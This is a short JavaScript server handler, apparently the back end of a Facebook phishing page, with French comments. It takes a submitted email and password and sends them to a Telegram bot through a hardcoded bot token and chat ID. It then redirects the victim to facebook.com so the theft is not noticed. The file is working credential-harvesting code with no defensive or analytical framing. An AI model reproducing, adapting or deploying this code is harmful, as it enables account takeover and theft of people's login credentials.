export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, pass } = req.body;

    const msg = `🔐 Facebook TEST\n👤 Email: ${email}\n🔑 Password: ${pass}`;
    const chat_id = "6299548804"; // Ton ID Telegram
    const token = "7210538824:AAF-sURnyKq7Ft9nJBOxLDm7n933yboIVDE"; // Ton token de bot

    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
    
    await fetch(telegramUrl);

    res.redirect("https://facebook.com"); // Redirection après soumission
  } else {
    res.status(405).end(); // Méthode non autorisée
  }
}
